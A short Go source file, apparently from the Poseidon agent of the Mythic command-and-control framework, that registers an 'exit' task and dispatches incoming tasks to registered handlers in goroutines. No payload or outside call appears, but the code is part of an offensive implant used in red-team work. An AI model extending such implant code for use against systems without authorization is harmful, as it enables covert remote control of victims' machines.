package tasks

import (
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"os"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/library"
)

var newTaskChannel = make(chan structs.Task, 10)


func init() {
	library.RegisterTask("exit", func(_ structs.Task) {
		os.Exit(0)
	})
}


// listenForNewTask uses NewTaskChannel to spawn goroutine based on task's Run method
func listenForNewTask() {
	for {
		task := <-newTaskChannel
		
		if f, ok := library.FindTask(task.Command); ok {
			go f(task)
		}

	}
}
